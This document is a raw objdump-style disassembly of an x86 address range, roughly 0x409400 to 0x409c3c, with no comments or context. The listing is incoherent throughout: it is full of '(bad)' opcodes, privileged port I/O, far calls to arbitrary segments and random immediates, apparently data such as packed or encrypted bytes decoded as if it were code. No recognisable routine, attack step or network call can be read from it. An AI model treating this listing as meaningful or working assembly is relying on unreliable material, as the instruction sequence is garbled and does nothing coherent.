  40941a:	ja     0x4093a6
  40941c:	pop    esp
  40941d:	push   edi
  40941e:	inc    edx
  40941f:	sti    
  409420:	dec    ebx
  409421:	jnp    0x409411
  409423:	push   esp
  409424:	cmp    al,0x89
  409426:	pop    edi
  409427:	pop    edi
  409428:	call   eax
  40942a:	imul   eax,DWORD PTR [ebx-0x146b1150],0xca6ad157
  409434:	mov    ?,edx
  409436:	jp     0x409422
  409438:	xlat   BYTE PTR ds:[ebx]
  409439:	jbe    0x4093d9
  40943b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40943c:	xchg   ebx,eax
  40943d:	sub    esp,ebx
  40943f:	xor    al,0x98
  409441:	test   BYTE PTR [ecx-0x57],0x19
  409445:	call   0x43e0:0x8f60475d
  40944c:	sbb    al,0xd3
  40944e:	into   
  40944f:	cmp    ebx,ebp
  409451:	dec    ebp
  409452:	jae    0x40949e
  409454:	jp     0x40948a
  409456:	stc    
  409457:	pushf  
  409458:	(bad)  
  409459:	sbb    al,0xba
  40945b:	in     al,dx
  40945c:	sbb    esi,edx
  40945e:	enter  0x2019,0xc7
  409462:	push   0x34
  409464:	pop    es
  409465:	pop    eax
  409466:	add    DWORD PTR [ecx+ebp*2+0x1b0d4719],0x7e
  40946e:	retf   0x402c
  409471:	retf   
  409472:	in     al,0x69
  409474:	je     0x4094c4
  409476:	jne    0x409444
  409478:	cmp    edx,DWORD PTR [edi+0x9]
  40947b:	out    dx,eax
  40947c:	jne    0x409452
  40947e:	int3   
  40947f:	int3   
  409480:	sbb    eax,0x74ab083a
  409485:	bound  ebx,QWORD PTR [eax]
  409487:	je     0x409507
  409489:	(bad)  
  40948a:	outs   dx,DWORD PTR ds:[esi]
  40948b:	(bad)
  40948e:	sub    edi,edx
  409490:	ja     0x409494
  409492:	jg     0x409422
  409494:	ror    DWORD PTR [esi+0x40014d66],1
  40949a:	sbb    DWORD PTR [ecx+0x6af05c6c],esp
  4094a0:	test   BYTE PTR ds:0x7d908df1,bh
  4094a6:	add    cl,BYTE PTR [edi]
  4094a8:	push   esp
  4094a9:	pop    edx
  4094aa:	pop    ds
  4094ab:	cld    
  4094ac:	jnp    0x4094e8
  4094ae:	inc    edx
  4094af:	mov    WORD PTR [ebx+ecx*8-0x21],es
  4094b3:	call   0xf15b:0x75601a54
  4094ba:	adc    dh,BYTE PTR [edi]
  4094bc:	nop
  4094bd:	mov    dl,0x85
  4094bf:	icebp  
  4094c0:	push   0x8af8024e
  4094c5:	jnp    0x4094c9
  4094c7:	mov    ebx,0xca41e8eb
  4094cc:	push   es
  4094cd:	and    al,0xcd
  4094cf:	jb     0x409549
  4094d1:	mov    esi,0x75440520
  4094d6:	enter  0x2e94,0xf
  4094da:	imul   DWORD PTR [edx+0x3dba43bc]
  4094e0:	dec    ebx
  4094e1:	pop    es
  4094e2:	pop    ss
  4094e3:	loope  0x4094a0
  4094e5:	bound  ebp,QWORD PTR [ecx+0x51a418b0]
  4094eb:	out    0xe1,al
  4094ed:	mov    esp,DWORD PTR [ecx-0x6ca43c7c]
  4094f3:	ins    BYTE PTR es:[edi],dx
  4094f4:	xor    esi,ebp
  4094f6:	jp     0x4094c4
  4094f8:	mov    esi,0x899c5914
  4094fd:	xor    al,0x8b
  4094ff:	add    edx,DWORD PTR [ecx+0x61]
  409502:	dec    esp
  409503:	mov    ebx,0x76322d5d
  409508:	cmc    
  409509:	shl    al,1
  40950b:	imul   ecx,ebx,0x6
  40950e:	adc    dl,BYTE PTR [edx+ebp*4-0x41]
  409512:	push   edx
  409513:	popf   
  409514:	ins    DWORD PTR es:[edi],dx
  409515:	loop   0x40953f
  409517:	ret    0x138d
  40951a:	push   ebx
  40951b:	xor    DWORD PTR [ebx+ecx*2-0x146c6163],esi
  409522:	fild   DWORD PTR [edx+0x36]
  409525:	ins    BYTE PTR es:[edi],dx
  409526:	xchg   esp,eax
  409527:	enter  0x58e0,0xf7
  40952b:	int    0xfa
  40952d:	pop    edi
  40952e:	jo     0x40951a
  409530:	jmp    0x6eb47ca8
  409535:	jmp    0x409565
  409537:	loope  0x4094f8
  409539:	xchg   edi,eax
  40953a:	shr    eax,cl
  40953c:	push   esi
  40953d:	push   ss
  40953e:	rcr    BYTE PTR [edi],0xb7
  409541:	sub    DWORD PTR [edi],ebp
  409543:	aas    
  409544:	or     ebx,DWORD PTR [esi]
  409546:	(bad)  
  409547:	jecxz  0x4095aa
  409549:	jnp    0x409531
  40954b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40954c:	sahf   
  40954d:	scas   al,BYTE PTR es:[edi]
  40954e:	mov    edx,0x8adc9b36
  409553:	and    ah,BYTE PTR [edx+eax*4-0xe]
  409557:	mov    ebx,0x32c9f300
  40955c:	push   edi
  40955d:	outs   dx,BYTE PTR ds:[esi]
  40955e:	in     al,0x9e
  409560:	inc    ebp
  409562:	leave  
  409563:	jecxz  0x4094ef
  409565:	les    ebp,FWORD PTR [ebx-0x556f87d1]
  40956b:	adc    ah,dl
  40956d:	xor    esp,eax
  40956f:	push   ss
  409570:	dec    esi
  409571:	jnp    0x4095c8
  409573:	test   eax,0x6465eb85
  409578:	repz and eax,0xc2d1efe8
  40957e:	push   esp
  40957f:	cmp    cl,al
  409581:	or     al,BYTE PTR [ebx-0x58fef29b]
  409587:	ins    BYTE PTR es:[edi],dx
  409588:	push   0xffffff83
  40958a:	xor    al,0x5c
  40958c:	int    0x27
  40958e:	clc    
  40958f:	inc    ecx
  409590:	(bad)  
  409591:	cwde   
  409592:	sbb    BYTE PTR [eax-0x22dab09d],dh
  409598:	mov    ebp,fs
  40959a:	mov    bh,0xf9
  40959c:	sub    BYTE PTR [esp+esi*2],0xb
  4095a0:	bound  ebx,QWORD PTR [ebx-0x7db1be38]
  4095a6:	cmc    
  4095a7:	xlat   BYTE PTR ds:[ebx]
  4095a8:	mov    esp,cs
  4095aa:	jne    0x4095e3
  4095ac:	dec    eax
  4095ad:	outs   dx,DWORD PTR ds:[esi]
  4095ae:	mov    esp,0x27146bb1
  4095b3:	mov    esi,0xe5ce9188
  4095b8:	aaa    
  4095b9:	aad    0xf0
  4095bb:	sahf   
  4095bc:	rol    DWORD PTR [edi-0x7d],0xf5
  4095c0:	shr    edi,cl
  4095c2:	add    esi,DWORD PTR [esp+esi*4]
  4095c5:	js     0x409586
  4095c7:	test   DWORD PTR [edi],ebx
  4095c9:	push   0xaff848b5
  4095ce:	loope  0x4095ec
  4095d0:	mov    edx,0x9407b8bd
  4095d5:	cli    
  4095d6:	jmp    0x4095b2
  4095d8:	mov    cl,0x49
  4095da:	cmp    al,0xb3
  4095dc:	push   cs
  4095dd:	xor    esp,edx
  4095df:	push   esp
  4095e0:	mov    eax,ds:0xe608889a
  4095e5:	in     eax,dx
  4095e6:	pop    eax
  4095e7:	sbb    al,0x51
  4095e9:	popf   
  4095ea:	lahf   
  4095eb:	and    DWORD PTR [ecx+0x6c9c1382],edi
  4095f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095f2:	loopne 0x4095f3
  4095f4:	add    DWORD PTR [edx+0x25],ebx
  4095f7:	sahf   
  4095f8:	call   0x6ffd2647
  4095fd:	in     eax,0x6a
  4095ff:	xchg   ebx,eax
  409600:	adc    al,0x81
  409602:	bsr    esi,ebp
  409605:	jbe    0x4095d1
  409607:	mov    ch,0x54
  409609:	ins    DWORD PTR es:[edi],dx
  40960a:	pop    es
  40960b:	adc    al,0x8b
  40960d:	call   0x2f8f1ab5
  409612:	in     eax,dx
  409613:	pop    ss
  409614:	or     eax,0x59060f9b
  409619:	dec    ebx
  40961a:	scas   al,BYTE PTR es:[edi]
  40961b:	xchg   esi,eax
  40961c:	xchg   esp,eax
  40961d:	outs   dx,BYTE PTR ds:[esi]
  40961e:	out    dx,eax
  40961f:	scas   al,BYTE PTR es:[edi]
  409620:	call   0x339e3bd8
  409625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409626:	out    0xae,eax
  409628:	sahf   
  409629:	mov    cl,0x3
  40962b:	add    esi,DWORD PTR [ebp+0x15]
  40962e:	jb     0x40962c
  409630:	pop    ds
  409631:	dec    edx
  409632:	push   ecx
  409633:	jns    0x40965b
  409635:	in     al,0xe5
  409637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409638:	mov    eax,ds:0xb0dddc6b
  40963d:	out    0x4b,eax
  40963f:	and    al,0xcf
  409641:	pop    ecx
  409642:	in     eax,0xf5
  409644:	jp     0x409623
  409646:	mov    ebp,0x2791a07e
  40964b:	mov    ch,0x29
  40964d:	inc    edx
  40964e:	mov    bh,0x91
  409650:	fwait
  409651:	xor    DWORD PTR [edx+eiz*8+0x38b7a448],0xfffffff9
  409659:	out    dx,al
  40965a:	or     edx,DWORD PTR [edx+edx*8-0x31]
  40965e:	or     ch,0xf
  409661:	jo     0x40960d
  409663:	ins    BYTE PTR es:[edi],dx
  409664:	lods   eax,DWORD PTR ds:[esi]
  409665:	cmp    DWORD PTR [edi-0x5f3d2c15],ebp
  40966b:	dec    esi
  40966c:	inc    eax
  40966d:	pop    ebp
  40966e:	push   ds
  40966f:	mov    ds:0x6f8fe6bf,eax
  409674:	push   esi
  409675:	jnp    0x4096b0
  409677:	fist   WORD PTR [ebx+0x4cee7781]
  40967d:	ret    0x5d7a
  409680:	jecxz  0x4096fc
  409682:	inc    eax
  409683:	cli    
  409684:	call   0xab05b1ee
  409689:	data16 mov ch,0x26
  40968c:	test   esi,eax
  40968e:	and    DWORD PTR [ecx+edi*4-0x364b8d21],esp
  409695:	cs inc edi
  409697:	jmp    FWORD PTR [eax+0x68ac5533]
  40969d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40969e:	enter  0xe631,0x76
  4096a2:	retf   
  4096a3:	push   cs
  4096a4:	aas    
  4096a5:	into   
  4096a6:	test   DWORD PTR [eax-0x39a4faf1],ecx
  4096ac:	jecxz  0x40964a
  4096ae:	push   esp
  4096af:	sbb    al,BYTE PTR [edx-0x6cc56cb8]
  4096b5:	mov    dh,BYTE PTR [ecx]
  4096b7:	push   esp
  4096b8:	sbb    eax,0x249cbe75
  4096bd:	loopne 0x409691
  4096bf:	je     0x4096e9
  4096c1:	mov    dh,0x13
  4096c3:	(bad)  
  4096c4:	mov    dh,0x57
  4096c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096c7:	sbb    eax,0x8e6a3a93
  4096cc:	sahf   
  4096cd:	test   DWORD PTR [esi-0x2d187c18],edx
  4096d3:	inc    edx
  4096d4:	retf   0xa646
  4096d7:	ss sti 
  4096d9:	test   BYTE PTR [ebp-0xf010c58],bh
  4096df:	out    0x91,eax
  4096e1:	xchg   esi,eax
  4096e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096e3:	xchg   BYTE PTR [esp+esi*1+0x11],dl
  4096e7:	call   0x679c:0x4807b58e
  4096ee:	cld    
  4096ef:	add    ebp,esp
  4096f1:	sbb    esi,esi
  4096f3:	sbb    eax,0xbed8e865
  4096f8:	stc    
  4096f9:	mov    ah,0xb3
  4096fb:	push   0x88c5d42d
  409700:	mov    ch,0xc6
  409702:	xor    ebx,DWORD PTR [eax+0x27836c67]
  409708:	shr    BYTE PTR [eax+0x3],1
  40970b:	out    0x32,eax
  40970d:	adc    cl,ah
  40970f:	addr16 aam 0x78
  409712:	cmp    BYTE PTR [edi+0x66],dh
  409715:	jmp    0x40973c
  409717:	ficom  WORD PTR [esi-0x72]
  40971a:	cwde   
  40971b:	aad    0x94
  40971d:	adc    DWORD PTR [edx-0x69fa6e94],eax
  409723:	and    ch,BYTE PTR [edx-0x62c862cf]
  409729:	pop    ebp
  40972a:	das    
  40972b:	rol    BYTE PTR [edi-0x233217e],0xf0
  409732:	ret    
  409733:	mov    edi,DWORD PTR [ecx-0x6b2c439c]
  409739:	jmp    0xb1b1:0x74fb54c1
  409740:	ret    
  409741:	fwait
  409742:	push   edx
  409743:	in     al,0xec
  409745:	mov    ah,0x37
  409747:	call   0xe32f399e
  40974c:	imul   edx,esi,0x677ceb00
  409752:	cdq    
  409753:	cdq    
  409754:	mov    esp,DWORD PTR [esi+0x43]
  409757:	bound  esi,QWORD PTR [esi+0x54]
  40975a:	jl     0x4096df
  40975c:	das    
  40975d:	imul   esp,DWORD PTR [esi-0x231c1f9e],0x7bf8643e
  409767:	jo     0x409703
  409769:	dec    edi
  40976a:	push   0xffffffe6
  40976c:	xor    DWORD PTR [eax+0x1],0xa654949d
  409773:	pop    es
  409774:	inc    esp
  409775:	(bad)  
  409776:	xchg   ebx,eax
  409777:	push   ss
  409778:	jo     0x40975a
  40977a:	and    eax,0x154cc74c
  40977f:	shr    DWORD PTR [eax+edi*1+0x65],1
  409783:	xor    eax,0x9561a43e
  409788:	adc    eax,0x988a0394
  40978d:	and    eax,0x1b5ce419
  409792:	aaa    
  409793:	pop    ss
  409794:	js     0x4097ee
  409796:	in     al,0xdf
  409798:	mov    esp,0x44963325
  40979d:	popa   
  40979e:	or     BYTE PTR [edx],al
  4097a0:	push   edi
  4097a1:	push   ebx
  4097a2:	pop    ebp
  4097a3:	adc    DWORD PTR [esi],esi
  4097a5:	test   BYTE PTR ds:[edi],ah
  4097a8:	and    eax,0xb368a367
  4097ad:	push   ebp
  4097ae:	bound  esp,QWORD PTR [edi+0x76]
  4097b1:	jne    0x40982a
  4097b3:	fcom   QWORD PTR [edi-0x750f0a46]
  4097b9:	push   es
  4097ba:	std    
  4097bb:	xor    eax,0x6df47e5f
  4097c0:	stos   DWORD PTR es:[edi],eax
  4097c1:	mov    ebp,DWORD PTR [edx+0x11]
  4097c4:	fidiv  DWORD PTR [edx-0x58]
  4097c7:	add    al,0x6f
  4097c9:	and    ch,BYTE PTR [ecx-0x57]
  4097cc:	pop    ss
  4097cd:	mov    cl,0xad
  4097cf:	mov    ds:0x130e4425,eax
  4097d4:	cwde   
  4097d5:	mov    eax,?
  4097d7:	inc    DWORD PTR [ebp+0x11349de3]
  4097dd:	adc    eax,0xaa1e1e0
  4097e2:	pop    ss
  4097e3:	jo     0x409779
  4097e5:	sub    dl,dl
  4097e7:	cs mov ebp,0xab017551
  4097ed:	cli    
  4097ee:	push   edx
  4097ef:	test   eax,0x277b70a3
  4097f4:	(bad)  
  4097f5:	jecxz  0x409846
  4097f7:	cld    
  4097f8:	es jp  0x409814
  4097fb:	sub    DWORD PTR [eax-0x5b1fa9df],edi
  409801:	pop    ebx
  409802:	adc    eax,0xad07623a
  409807:	aad    0x8c
  409809:	shr    DWORD PTR ds:0xac6d436a,1
  40980f:	not    BYTE PTR [edi+edx*1]
  409812:	xchg   edi,eax
  409813:	in     eax,0x82
  409815:	shl    DWORD PTR [ecx],1
  409817:	sbb    DWORD PTR [edx-0x6a755b9f],esp
  40981d:	fild   DWORD PTR [ecx+0x48582412]
  409823:	jmp    0x10b4:0x392ee327
  40982a:	dec    ecx
  40982b:	cwde   
  40982c:	pop    esi
  40982d:	or     esi,ebx
  40982f:	ret    0x8cda
  409832:	mov    dl,0x21
  409834:	cmp    cl,BYTE PTR [edi-0x6c]
  409837:	cli    
  409838:	test   esi,eax
  40983a:	ins    DWORD PTR es:[edi],dx
  40983b:	jle    0x409873
  40983d:	inc    si
  40983f:	push   edx
  409840:	mov    bl,0x5a
  409842:	jb     0x409858
  409844:	je     0x4097f5
  409846:	xchg   ecx,eax
  409847:	adc    eax,0xf6b30a5c
  40984c:	jno    0x409866
  40984e:	dec    ecx
  40984f:	mov    esp,0x99ff1d8e
  409854:	in     al,0x92
  409856:	push   cs
  409857:	jmp    0x3889:0xc8064a15
  40985e:	pop    edx
  40985f:	(bad)  
  409861:	mov    ds:0xf0a894c1,eax
  409866:	or     al,0x24
  409868:	popf   
  409869:	stos   DWORD PTR es:[edi],eax
  40986a:	daa    
  40986b:	mov    BYTE PTR [ecx-0x4722385b],0x43
  409872:	fs pop edi
  409874:	test   BYTE PTR [esp+edx*4-0x6e5e50c5],dl
  40987b:	icebp  
  40987c:	hlt    
  40987d:	fld    QWORD PTR [esi]
  40987f:	imul   esp,DWORD PTR [ebp-0x21],0x69
  409883:	les    edi,FWORD PTR ds:0xfba95ded
  409889:	push   eax
  40988a:	or     al,0x9c
  40988c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40988d:	cwde   
  40988e:	cli    
  40988f:	xor    edx,DWORD PTR [eax+0x7e39cf25]
  409895:	cmp    DWORD PTR [esi+0x6e2304b7],eax
  40989b:	vcmppd ymm1,ymm4,YMMWORD PTR [ecx-0x5e7a3fd6],0x7e
  4098a4:	push   esp
  4098a5:	mov    eax,0x4a2a3aa4
  4098aa:	outs   dx,BYTE PTR ds:[esi]
  4098ab:	xchg   BYTE PTR ds:0x96b60d71,bl
  4098b1:	popa   
  4098b2:	cmp    DWORD PTR [ecx-0x33],esi
  4098b5:	xchg   edx,eax
  4098b6:	inc    esi
  4098b7:	clc    
  4098b8:	jmp    0xbf539362
  4098bd:	pushf  
  4098be:	cmp    eax,0xe28e1a70
  4098c3:	sub    dh,ch
  4098c5:	inc    edi
  4098c6:	mov    ds:0x508ed358,eax
  4098cb:	push   es
  4098cc:	mov    ecx,0x4b3b22d7
  4098d1:	inc    ecx
  4098d2:	sub    eax,0xf8de7c75
  4098d7:	push   0xfffffffb
  4098d9:	int3   
  4098da:	push   esi
  4098db:	or     ebp,0xffffffca
  4098de:	idiv   BYTE PTR [ecx+0x11a16913]
  4098e4:	or     ebp,DWORD PTR [esp-0x30]
  4098e8:	xchg   edi,eax
  4098e9:	test   al,0x45
  4098eb:	call   0xcb3f:0x91dac4cf
  4098f2:	sbb    DWORD PTR [ecx+0x3],eax
  4098f5:	and    BYTE PTR [ebp-0x73f36156],al
  4098fb:	xchg   esi,eax
  4098fc:	lahf   
  4098fd:	dec    ebx
  4098fe:	jmp    0x78ed:0x5e07ac5a
  409905:	pop    es
  409906:	pusha  
  409907:	xchg   esi,eax
  409908:	mov    al,ds:0x3a759bc8
  40990d:	mov    cs,WORD PTR [esi+esi*8-0x412b00d6]
  409914:	aad    0x1e
  409916:	jge    0x40990d
  409918:	in     eax,0xfc
  40991a:	cli    
  40991b:	fsubr  QWORD PTR [ecx-0x3d]
  40991e:	inc    ecx
  40991f:	cmc    
  409920:	stos   BYTE PTR es:[edi],al
  409921:	addr16 pop esi
  409923:	adc    dh,dl
  409925:	(bad)  
  409926:	pop    ss
  409927:	xchg   DWORD PTR [ebp-0x4795d835],ebx
  40992d:	test   ax,0x93a1
  409931:	lods   al,BYTE PTR ds:[esi]
  409932:	fisub  WORD PTR [esi-0x70]
  409935:	cdq    
  409936:	jmp    0x8be2:0xfbd4947d
  40993d:	add    al,0x84
  40993f:	ja     0x40999b
  409941:	mov    esi,0xf8895f36
  409946:	mov    BYTE PTR [eax-0x1db3599c],al
  40994c:	adc    esp,DWORD PTR [edx-0x45]
  40994f:	(bad)  
  409950:	cmp    DWORD PTR [ecx],ebx
  409952:	jmp    0x1325:0x3cac159
  409959:	out    0x81,al
  40995b:	scas   al,BYTE PTR es:[edi]
  40995c:	in     eax,dx
  40995d:	push   esi
  40995e:	loop   0x40998c
  409960:	mov    al,ds:0x7aa4137f
  409965:	mov    edi,0xa0b496af
  40996a:	sbb    DWORD PTR ds:0xf48d8bc4,edi
  409970:	add    bl,BYTE PTR [esi+edx*8]
  409973:	sub    DWORD PTR [esi+0x43bbab7a],ebp
  409979:	inc    eax
  40997a:	icebp  
  40997b:	or     eax,0x512c68a4
  409980:	in     al,0x47
  409982:	cmp    eax,0x3a40e7f8
  409987:	xchg   ebx,eax
  409988:	loop   0x409987
  40998a:	jb     0x4099a6
  40998c:	and    edx,DWORD PTR [esi]
  40998e:	mov    dl,0xd8
  409990:	adc    cl,BYTE PTR [ebx+ebp*1]
  409993:	shr    BYTE PTR [edi-0xf8deff4],1
  409999:	retf   0x330d
  40999c:	test   DWORD PTR ds:0x36281d04,edi
  4099a2:	mov    edi,0xc721b93
  4099a7:	mov    edx,0x40a13811
  4099ac:	mov    esi,0x8cef1bda
  4099b1:	retf   0xe5f
  4099b4:	jb     0x409980
  4099b6:	mov    al,ds:0x1fcd6f9c
  4099bb:	sub    eax,0x3aa809a8
  4099c0:	xchg   edx,eax
  4099c1:	sbb    DWORD PTR [ebx],esp
  4099c3:	(bad)
  4099c6:	stos   BYTE PTR es:[edi],al
  4099c7:	call   0xbee925b2
  4099cc:	in     eax,0xf7
  4099ce:	add    eax,0x68e464e5
  4099d3:	ins    DWORD PTR es:[edi],dx
  4099d4:	das    
  4099d5:	vmulsd xmm1,xmm2,xmm7
  4099d9:	dec    esi
  4099da:	mov    ebx,0xae45e90c
  4099df:	int3   
  4099e0:	ins    DWORD PTR es:[edi],dx
  4099e1:	iret   
  4099e2:	jne    0x409a4e
  4099e4:	sbb    DWORD PTR [esi+0x67f3dce7],ebx
  4099ea:	mov    ebp,0x1e14665e
  4099ef:	fs jecxz 0x4099ab
  4099f2:	test   DWORD PTR [esi+0x5892075d],0xcf062dfd
  4099fc:	aad    0xda
  4099fe:	ret    0xe9df
  409a01:	(bad)  
  409a03:	mov    edx,0x2f2cb3eb
  409a08:	mul    DWORD PTR [esi]
  409a0a:	and    BYTE PTR [edi+edi*4],0x21
  409a0e:	jg     0x409a3f
  409a10:	jge    0x409a1b
  409a12:	cmp    ebp,DWORD PTR [edx]
  409a14:	sbb    BYTE PTR [esi-0x6b],ah
  409a17:	push   ebx
  409a18:	inc    esp
  409a19:	xchg   edx,eax
  409a1a:	pop    edi
  409a1b:	jmp    0x6d3069cd
  409a20:	sub    DWORD PTR [ecx-0x4a97a432],esi
  409a26:	cmc    
  409a27:	out    dx,eax
  409a28:	retf   0x3570
  409a2b:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  409a2d:	mov    al,ds:0xda9acdc8
  409a32:	ret    0xfb7f
  409a35:	push   edx
  409a36:	call   0x5d264b21
  409a3b:	popf   
  409a3c:	push   ebx
  409a3d:	and    BYTE PTR cs:[edi+0x5f1aa32],0x54
  409a45:	xchg   ecx,eax
  409a46:	pushf  
  409a47:	add    eax,0xf8dd923b
  409a4c:	mov    ebp,0x3739475e
  409a51:	sahf   
  409a52:	jnp    0x409abd
  409a54:	rcr    DWORD PTR [eax],1
  409a56:	cs clc 
  409a58:	sub    dl,BYTE PTR [eax+0x2f]
  409a5b:	stos   DWORD PTR es:[edi],eax
  409a5c:	clc    
  409a5d:	cmp    edx,DWORD PTR [ebx]
  409a5f:	push   ecx
  409a60:	out    0x71,al
  409a62:	mov    dh,0x6f
  409a64:	test   eax,0xc4a9b389
  409a69:	fwait
  409a6a:	or     eax,0x6afa355
  409a6f:	fcmove st,st(3)
  409a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a72:	out    0xcc,eax
  409a74:	jmp    0xb679d7bd
  409a79:	cld    
  409a7a:	push   edi
  409a7b:	and    ebx,0xfffffffd
  409a7e:	or     BYTE PTR [eax+esi*2+0x951cacc],dl
  409a85:	add    dh,bl
  409a87:	and    al,0x7f
  409a89:	or     eax,0xd901e56c
  409a8e:	sub    dh,dh
  409a90:	lods   eax,DWORD PTR ds:[esi]
  409a91:	or     eax,0x19317362
  409a96:	xchg   edi,eax
  409a97:	cwde   
  409a98:	add    bh,BYTE PTR [esi+0x6f015247]
  409a9e:	std    
  409a9f:	xchg   esi,eax
  409aa0:	or     ah,BYTE PTR [ebp-0x1d]
  409aa3:	aad    0x4a
  409aa5:	aad    0x7f
  409aa7:	(bad)  
  409aa8:	stos   DWORD PTR es:[edi],eax
  409aa9:	in     al,0xb1
  409aab:	push   eax
  409aac:	sub    DWORD PTR [edx],ebp
  409aae:	call   0x7ba04fb
  409ab3:	jnp    0x409b2d
  409ab5:	jb     0x409a7c
  409ab7:	int    0xe6
  409ab9:	std    
  409aba:	adc    edx,DWORD PTR [ecx+0x29]
  409abd:	or     BYTE PTR [ebx],bh
  409abf:	rcl    BYTE PTR [ebp+0x2eae2044],0x4b
  409ac6:	push   ss
  409ac7:	fwait
  409ac8:	adc    eax,0xfae6af41
  409acd:	inc    esp
  409ace:	pop    edx
  409acf:	sub    ah,ah
  409ad1:	cli    
  409ad2:	xchg   esi,eax
  409ad3:	loope  0x409a76
  409ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ad6:	test   eax,0x1688f94
  409adb:	inc    ecx
  409adc:	xchg   edi,eax
  409add:	pop    edx
  409ade:	pop    esp
  409adf:	popf   
  409ae0:	pop    edx
  409ae1:	push   eax
  409ae2:	shr    BYTE PTR [ecx+0x6057771b],0xa3
  409ae9:	popa   
  409aea:	out    0xab,al
  409aec:	mov    cl,BYTE PTR [edi+0x61e4c511]
  409af2:	loopne 0x409ac7
  409af4:	int    0xdf
  409af6:	mov    DWORD PTR [edx],0x2651a752
  409afc:	push   ebx
  409afd:	pop    edx
  409afe:	inc    ebp
  409aff:	fcomp  DWORD PTR [ecx+0x5e]
  409b02:	shl    DWORD PTR [edx],0x3c
  409b05:	pop    edx
  409b06:	not    DWORD PTR [ebp*8+0xe8db33d]
  409b0d:	dec    esi
  409b0e:	les    edi,FWORD PTR ds:0x8d61dc68
  409b14:	jne    0x409ad2
  409b16:	test   BYTE PTR [eax-0x13],ah
  409b19:	out    dx,eax
  409b1a:	pusha  
  409b1b:	cmp    dh,ah
  409b1d:	test   al,0x5f
  409b1f:	iret   
  409b20:	sub    eax,DWORD PTR [edi-0x27c25801]
  409b26:	stos   BYTE PTR es:[edi],al
  409b27:	xchg   esp,eax
  409b28:	and    al,0xb2
  409b2a:	rol    DWORD PTR [edx+0x164d2c06],cl
  409b30:	(bad)  
  409b31:	call   0x152b7887
  409b36:	cs pop ecx
  409b38:	ss into 
  409b3a:	popf   
  409b3b:	sbb    eax,0xcee89ab6
  409b40:	mov    bh,0xc0
  409b42:	retf   0x15f
  409b45:	fisubr DWORD PTR [ebp-0x61]
  409b48:	out    0x15,al
  409b4a:	mov    al,0x7d
  409b4c:	hlt    
  409b4d:	and    al,0xf0
  409b4f:	adc    DWORD PTR [eax+0x34],eax
  409b52:	out    0x6e,eax
  409b54:	stc    
  409b55:	in     al,dx
  409b56:	mov    ds:0x3b711688,eax
  409b5b:	mov    ebp,0xf65910ff
  409b60:	stc    
  409b61:	mov    esp,0xe059c8c0
  409b66:	mov    dl,0x4
  409b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b69:	mov    ds:0xd73f6e5d,al
  409b6e:	leave  
  409b6f:	add    ebp,esp
  409b71:	das    
  409b72:	push   esi
  409b73:	je     0x409b12
  409b75:	scas   al,BYTE PTR es:[edi]
  409b76:	cmp    bh,BYTE PTR [ebx+0x5f]
  409b79:	fs xor al,0x45
  409b7c:	pop    eax
  409b7d:	pop    es
  409b7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b7f:	(bad)  
  409b80:	pop    ebx
  409b81:	mov    ds:0xf084e2e6,eax
  409b86:	xchg   DWORD PTR [ebp+0x5d5b3669],esp
  409b8c:	mov    dl,0xca
  409b8e:	pop    eax
  409b8f:	pushf  
  409b90:	dec    edx
  409b91:	sbb    eax,eax
  409b93:	xchg   ebp,eax
  409b94:	jbe    0x409be7
  409b96:	lods   eax,DWORD PTR ds:[esi]
  409b97:	and    ebx,DWORD PTR [edi]
  409b99:	mov    DWORD PTR [ebx+0x36],ebx
  409b9c:	add    eax,0xac62c475
  409ba1:	push   ebx
  409ba2:	sahf   
  409ba3:	jmp    0x409bf8
  409ba5:	pop    eax
  409ba6:	outs   dx,BYTE PTR ds:[esi]
  409ba7:	sahf   
  409ba8:	les    ebx,FWORD PTR [ebx]
  409baa:	push   ecx
  409bab:	pop    ds
  409bac:	sub    ch,dl
  409bae:	pop    ebp
  409baf:	dec    ecx
  409bb0:	jo     0x409c10
  409bb2:	cmp    DWORD PTR [ebx],0xde5bc86a
  409bb8:	cmp    ah,cl
  409bba:	pushf  
  409bbb:	pop    es
  409bbc:	jmp    0x409b40
  409bbe:	rcl    ebx,cl
  409bc0:	pop    edx
  409bc1:	call   0x196b29b7
  409bc6:	mov    ds:0x83fe07dd,al
  409bcb:	or     al,dh
  409bcd:	nop
  409bce:	push   0x622f73d0
  409bd3:	aaa    
  409bd4:	bound  edi,QWORD PTR [esi]
  409bd6:	pop    esi
  409bd7:	test   BYTE PTR [edi+edi*4-0x600d54b3],bl
  409bde:	test   ah,al
  409be0:	test   al,0x59
  409be2:	sti    
  409be3:	std    
  409be4:	icebp  
  409be5:	mov    esi,DWORD PTR [esi]
  409be7:	sbb    eax,0x9498592d
  409bec:	in     eax,dx
  409bed:	mov    edi,0x96332403
  409bf2:	mov    eax,0x5e6a34ee
  409bf8:	rol    al,cl
  409bfa:	fcmovbe st,st(2)
  409bfc:	fwait
  409bfd:	jns    0x409c71
  409bff:	push   ds
  409c00:	jne    0x409bfb
  409c02:	inc    edi
  409c03:	fdivr  QWORD PTR [esp+eiz*2+0x3c]
  409c07:	jo     0x409bb8
  409c09:	mov    ebx,0xae44b9ec
  409c0e:	call   0x51527b29
  409c13:	push   ds
  409c14:	fsub   QWORD PTR [eax]
  409c16:	mov    ds:0xf71568f2,eax
  409c1b:	addr16 aas 
  409c1d:	jecxz  0x409bdc
  409c1f:	(bad)  
  409c20:	fs jno 0x409c3a
  409c23:	out    dx,al
  409c24:	ins    DWORD PTR es:[edi],dx
  409c25:	jl     0x409be7
  409c27:	cwde   
  409c28:	sub    edx,DWORD PTR [edi-0x13d94b49]
  409c2e:	mov    esp,0xc9f03b6d
  409c33:	and    eax,0x2fef48bb
  409c38:	cmp    DWORD PTR [ecx-0x1f],edx
  409c3b:	pop    edi
  409c3c:	or     al,0x6e
